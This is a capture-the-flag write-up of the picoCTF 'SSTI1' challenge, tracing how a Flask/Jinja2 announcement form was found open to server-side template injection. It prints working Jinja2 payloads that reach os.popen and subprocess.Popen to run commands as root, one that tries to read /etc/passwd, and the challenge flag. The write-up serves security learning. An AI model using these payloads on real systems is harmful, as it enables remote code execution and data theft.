<h1> SSTI1 </h1>

From: https://play.picoctf.org/practice/challenge/492

Author: Venax

Description: I made a cool website where you can announce whatever you want! Try it out!

Tags: Easy, Web Exploitation, PicoCTF 2025, browser_webshell_solvable
---

Beginning of challenge:

Immediately after launching the challenge instance you are directed to a website with basic html and a prominent form to announce to the site.
![image](https://github.com/user-attachments/assets/d9dd00a3-09f9-4cb6-9dd2-df17e5687f33)

After entering a string to the form, the website directs you to an announce page with your input text displayed.
![image](https://github.com/user-attachments/assets/b52c3e2b-6229-4f52-bb75-4f2cce7b377e)

<details>
<summary> CONTINUE - SPOILERS </summary>
Directly changing your URL to this announce page doesn't yield results:
  
![image](https://github.com/user-attachments/assets/e3fa69cf-67f8-43e9-a89c-89bcbc10ebdc)

After some experimentation, I wasn't able to deduce whether this something SQL exploitable, and decided to take the hint from the PicoCTF instance. This revealed the exploit for this CTF is known as server-side-template injection.

The portswigger article: https://portswigger.net/web-security/server-side-template-injection describes this explot as __"when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side."__

After futher experimentation, and now understanding that string formatting is often performed using curly brackets {}, sending the server the a set of nested curly brackets {{}} resulted in an internal server error, error 500.

![image](https://github.com/user-attachments/assets/2b0066c4-0e89-49c9-b0a3-d1c87fede2b3)

When placing any plaintext within these braces, the error dissapears and completely blank HTML page is returned when the form is executed.

Based on the error returned, i thought it might be possible that this application is a Flask application, see: https://www.digitalocean.com/community/tutorials/how-to-handle-errors-in-a-flask-application based searching the error text in Google.

To confirm server side execution ability, we sent {{7*7}} which resulted in the page showing me the numbers 49. This implies that anything we place within the double curly braces can be evaluated. 

Following along with the portswigger article, and the indentify section, we determine that this is framework is likely using Jinja2 because "The payload {{7*'7'}} returns 49 in Twig and 7777777 in Jinja2."
![image](https://github.com/user-attachments/assets/1a2aee31-7607-4b5e-916c-16786617ba99)


Now that we know it is Jinja2, I found https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ to be useful for specifics regarding exploitation of this framework. Similarly, the Jinja docs were useful for referencing what the OnSecurity aricle was discussing: https://jinja.palletsprojects.com/en/stable/api/#jinja2.Environment

Sending: {{global_name.__class__.__mro__}}

- Returns: (<class 'jinja2.runtime.Undefined'>, <class 'object'>)

Sending: {{global_name.__class__.__base__}}

- Returns: <class 'object'>

Sending: __{{g.__class__.__mro__}}__

- Returns: (<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>)

Sending: __{{g.__class__.mro()}}__

- Returns: [<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>]

Sending: __{{g['__class__']['mro']()}}__

- Returns: [<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>]

Sending: __{{g['__class__']['__mro__']}}__

- Returns: (<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>)

Furthermore from the OnSecurity article, I played around with some of the payloads discussed there...

Sending: __{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}__

- Returns: uid=0(root) gid=0(root) groups=0(root) 

From the developing an exploiut in https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#payload-development-from-0...
![image](https://github.com/user-attachments/assets/b23ae18f-6e68-48c6-8b1a-6632659c9392)

Sending: __{{get_flashed_messages}}__

- Returns: <function get_flashed_messages at 0x75e143dc5550>

Sending: __{{get_flashed_messages.__class__}}__

- Returns: <class 'function'>

Sending: __{{get_flashed_messages.__class__.__mro__}}__
- Returns: (<class 'function'>, <class 'object'>)

Sending: __{{get_flashed_messages.__class__.__mro__[1]}}__
- Returns: <class 'object'>

Sending: __{{get_flashed_messages.__class__.__mro__[1].__subclasses__()}}__

- Returns: All the subclasses for the get_flashed_messages object subclass. It is very long so I haven't included it as plaintext... see:
![image](https://github.com/user-attachments/assets/b9684b62-ef29-4c30-b91b-4f48e44aa67a)

Sending: __{{g}}__

- Returns: <flask.g of 'app'>

Sending: __{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]}}__

- Returns: <class 'mappingproxy'>

Sending: __{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd')}}__

- Returns: /etc/passwd

Sending: __{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}__

- Returns: __Internal server error__


After a bit of further self experimentation, I took the 'app' name of the application and started parsing some similar dunder methods to it to see what was getting returned, maybe we can find our winfunction this way.

Sending: __{{app.__class__}}__

- Returns: <class 'jinja2.runtime.Undefined'>

Sending: __{{app.__class__.__mro__}}__

- Returns: (<class 'jinja2.runtime.Undefined'>, <class 'object'>)

When sending: __{{app.__class__.__mro__[1].__subclasses__()}}__, I received all the subclasses again. However, this time I put it into my IDE and replaced all commas with newlines to better visualise it.
![image](https://github.com/user-attachments/assets/d53d70c7-0f86-4da5-a79a-df0aafcc8655)

After querying ChatGPT on where I should begin my investigations regarding vulnerable subclasses, I decided to hone in on <class 'subprocess.Popen'> and returned this by indexing the above function with [356]. 
>> {{app.__class__.__mro__[1].__subclasses__()[356]}}

Popen is expliotable because __"The popen() function shall execute the command specified by the string command. It shall create a pipe between the calling program and the executed command, and shall return a pointer to a stream that can be used to either read from or write to the pipe."__
from: https://pubs.opengroup.org/onlinepubs/009696799/functions/popen.html
![image](https://github.com/user-attachments/assets/d06d5171-459f-4511-9f12-c1688e3d9264)

We can now execute Popen through: __{{app.__class__.__mro__[1].__subclasses__()[356]}}__

For example, if we want to list the current directory, we can pass the linux commands ls to the args via a list:

Sending: {{app.__class__.__mro__[1].__subclasses__()[356](['ls', '-la], stdout=-1).communicate()[0].decode()}}

Returns:

<details>
<summary> ls output </summary>
total 12

drwxr-xr-x 1 root root    25 Apr 13 03:37 .

drwxr-xr-x 1 root root    23 Apr 13 03:37 ..

drwxr-xr-x 2 root root    32 Apr 13 03:37 __pycache__

-rwxr-xr-x 1 root root  1241 Mar  6 03:27 app.py

-rw-r--r-- 1 root root    58 Mar  6 19:43 flag

-rwxr-xr-x 1 root root   268 Mar  6 03:27 requirements.txt
</details>

Hooray! Success

It seems like we found the flag file. However, out of curiosity lets check out what the requirements.txt file is first.

<details>
<summary> requirements.txt output </summary>
ÿþblinker==1.8.2

click==8.1.7

colorama==0.4.6

Flask==3.0.3

itsdangerous==2.2.0

Jinja2==3.1.4

MarkupSafe==2.1.5

Werkzeug==3.0.3
</details>

Seems like just details for the application to run, maybe a docker thing?



<h3>Win</h3>
Lastly, lets using the linux read file command cat to open the flag file:


Sending: __{{app.__class__.__mro__[1].__subclasses__()[356](['cat', 'flag'], stdout=-1).communicate()[0].decode()}}__

- Returns __picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}__

---------------------------------------------------------------------------------------------------------------------

Applications used during CTF:
-Kali Linux (OS)
-Mozilla Firefox (Web Browser)
-Visual Studio Code

Core sources of information:
Portswigger: https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack
  - Overview of Server Side Template Injection

DigitalOcean: https://www.digitalocean.com/community/tutorials/how-to-handle-errors-in-a-flask-application
  - Understanding some error handling characteristics of Flask applications

Jinja: https://jinja.palletsprojects.com/en/stable/templates/
  - Understanding templating documentation and implementation

PythonDocs: https://docs.python.org/3/library/subprocess.html#subprocess.Popen
  - Understanding Popen

ChatGPT: https://chatgpt.com/
  - Getting an overview of common vulnerable subclasses and understanding the syntax of parsing lists to the Popen function.

</details>


